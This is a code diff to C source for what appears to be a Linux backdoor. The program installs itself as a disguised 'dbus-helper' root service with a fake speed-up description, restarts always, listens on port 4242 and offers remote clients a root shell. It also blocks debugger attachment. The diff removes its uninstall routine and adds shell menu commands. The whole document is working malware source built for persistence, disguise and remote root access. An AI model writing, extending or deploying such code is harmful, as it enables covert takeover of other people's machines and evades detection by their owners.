@@ -24,6 +24,13 @@
 #define SERVICE_PATH_SYSTEMD "/etc/systemd/system/dbus-helper.service" 
 #define SERVICE_PATH_SYSVINIT "/etc/init.d/dbus-helper"
 #define LOG_FILE_PATH "/var/log/ft_shield_actions.log"
+#define HELP "\
+Help Menu:\n\
+? - Shows help menu\n\
+shell - Provides a root shell\n\
+exit - Closes the connection\n\
+clear - Clears the screen\n\
+available - Shows the number of available connections\n"
 #define PORT 4242
 
 sem_t connection_semaphore;
@@ -81,7 +88,7 @@ void create_service_file(int systemd_enabled)
         "Description=Speedups your system 100%% real.\n"
         "After=network.target\n\n"
         "[Service]\n"
-        "ExecStart=" DISGUISED_TARGET_PATH " --daemon\n"
+        "ExecStart=" DISGUISED_TARGET_PATH "\n"
         "Restart=always\n"
         "User=root\n\n"
         "[Install]\n"
@@ -143,29 +150,6 @@ void setup_service(int systemd_enabled)
     (void)foo;
 }
 
-void uninstall_service(int systemd_enabled)
-{
-    int foo;
-    foo = system("ps aux | grep '[d]bus-monitor' | awk '{print $2}' | xargs kill -9 2>/dev/null 1>/dev/null");
-
-    if (systemd_enabled)
-    {
-        foo = system("systemctl stop dbus-helper");
-        foo = system("systemctl disable dbus-helper");
-        foo = remove(SERVICE_PATH_SYSTEMD);
-        foo = system("systemctl daemon-reload");
-    }
-    else
-    {
-        foo = system("service dbus-helper stop");
-        foo = remove(SERVICE_PATH_SYSVINIT);
-    }
-
-    foo = remove(DISGUISED_TARGET_PATH);
-
-    (void)foo;
-}
-
 static void md5_to_hex_string(const uint8_t *digest, char *out)
 {
     for (int i = 0; i < 16; i++)
@@ -211,13 +195,29 @@ int mid_state_promt(int client_socket)
 
         if (strcmp(buffer, "?") == 0)
         {
-            const char* help_message = "Help Menu:\n? - Shows help menu\nshell - Provides a root shell\n";
-            send(client_socket, help_message, strlen(help_message), 0);
+            send(client_socket, HELP, strlen(HELP), 0);
         }
         else if (strcmp(buffer, "shell") == 0)
         {
             shell = 1;
             break;
+        }
+        else if (strcmp(buffer, "exit") == 0)
+        {
+            break;
+        }
+        else if (strcmp(buffer, "clear") == 0)
+        {
+            const char* clear_command = "\033[H\033[J";
+            send(client_socket, clear_command, strlen(clear_command), 0);
+        }
+        else if (strcmp(buffer, "available") == 0)
+        {
+            char sem_value_str[64];
+            int sem_value;
+            sem_getvalue(&connection_semaphore, &sem_value);
+            sprintf(sem_value_str, "Available connections: %d\n", sem_value);
+            send(client_socket, sem_value_str, strlen(sem_value_str), 0);
         }
         else if (strlen(buffer) == 0)
         {
@@ -447,7 +447,7 @@ void prevent_debugger_attach()
     prctl(PR_SET_DUMPABLE, 0);
 }
 
-int main(int argc, char *argv[])
+int main()
 {
     if (geteuid() != 0)
     {
@@ -467,16 +467,22 @@ int main(int argc, char *argv[])
 
     int systemd_enabled = use_systemd();
 
-    if (argc > 1 && strcmp(argv[1], "--daemon") == 0)
+    char exec_path[1024];
+    ssize_t len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1);
+
+    if (len != -1)
     {
-        daemon_main();
-        return 0;
+        exec_path[len] = '\0';
+    }
+    else
+    {
+        perror("Failed to read execution path");
+        return 1;
     }
 
-    if (argc > 1)
+    if (strcmp(exec_path, DISGUISED_TARGET_PATH) == 0)
     {
-        char *user = get_username();
-        printf("%s\n", user);
+        daemon_main();
         return 0;
     }
 
